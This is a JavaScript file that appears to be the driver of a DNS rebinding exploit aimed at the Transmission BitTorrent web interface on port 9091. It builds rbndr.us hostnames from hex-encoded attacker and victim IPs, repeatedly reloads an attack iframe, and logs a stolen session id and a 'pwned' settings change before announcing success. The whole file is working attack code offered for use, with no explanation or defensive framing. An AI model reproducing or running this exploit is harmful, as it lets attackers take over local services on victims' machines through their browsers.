var timer;
var count = 0;

// parameters for attack
var attacker = "10.0.2.30";
var victim = "127.0.0.1";
var interval = 5;

function convert_dotted_quad(addr) {
	return addr.split('.')
			.map(function (a) { return Number(a).toString(16) })
			.map(function (a) { return a.length < 2 ? "0" + a : a })
			.join('');
}

window.addEventListener("message", function (msg) {
	console.log("message received from", msg.origin, msg.data.status);

	if (msg.data.status == "start") {
		console.log("iframe reports that attack has started");
		if (msg.origin == document.getElementById("attack").src.substr(0, msg.origin.length)) clearInterval(timer);
		msg.source.postMessage({cmd: "interval", param: interval}, "*");
		msg.source.postMessage({cmd: "start", param: null}, "*");
	}
	if (msg.data.status == "session") {
		console.log("iframe reports that session id has been recovered:", msg.data.sessionid);
	}
	if (msg.data.status == "pwned") {
		console.log("iframe reports that settings have been changed", msg.data.response);
		attack.contentWindow.postMessage({cmd: "stop"}, "*");
		clearInterval(timer);
		alert("Attack Successful: " + msg.data.response);
	}
});

function reloadFrame() {
	document.getElementById("attack").src = "http://"
		+ convert_dotted_quad(attacker)
		+ "."
		+ convert_dotted_quad(victim)
		+ ".rbndr.us:9091/transmission/iframe.html"
		+ "?rnd=" + Math.random();
		var tmp = attacker;
		attacker = victim;
		victim = tmp;
}

function begin() {
	start.disabled = true;
	timer = setInterval(reloadFrame, interval * 1000);
	reloadFrame();
}
